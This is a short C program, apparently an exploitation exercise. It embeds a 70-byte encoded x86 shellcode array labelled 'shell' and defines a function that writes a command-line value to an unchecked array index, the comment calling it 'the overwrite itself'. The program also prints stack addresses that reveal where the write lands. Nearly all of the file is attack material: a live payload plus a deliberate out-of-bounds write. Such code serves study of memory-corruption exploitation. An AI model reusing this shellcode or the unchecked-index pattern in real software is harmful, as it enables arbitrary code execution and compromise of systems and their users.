#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// shell
    char shellcode_shell[70] = "\xbb\x90\x32\x10\x70\xda\xde\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1\x0b\x83\xc5\x04\x31\x5d\x11\x03\x5d\x11\xe2\x65\x58\x1b\x28\x1c\xcf\x7d\xa0\x33\x93\x08\xd7\x23\x7c\x78\x70\xb3\xea\x51\xe2\xda\x84\x24\x01\x4e\xb1\x3f\xc6\x6e\x41\x6f\xa4\x07\x2f\x40\x5b\xbf\xaf\xc9\xc8\xb6\x51\x38\x6e" ;


void place_int_array(int slot, int value)
{
	int array[32];

	array[slot] = value;	/* the overwrite itself */
	printf("filled slot %d with %d.\n", slot, value);
	printf("array[0] = %p\n", &array[0]);
	printf("array[%d] = %d = %p @ %p:%s\n", slot,array[slot],array[slot],&array[slot],array[slot]);
	return;
}

int main(int argc, char **argv)
{
	if (argc != 3)
		printf("syntax: %s [slot] [value]\n", argv[0]);
	else
		place_int_array(atoi(argv[1]), atoi(argv[2]));

	exit(0);
}
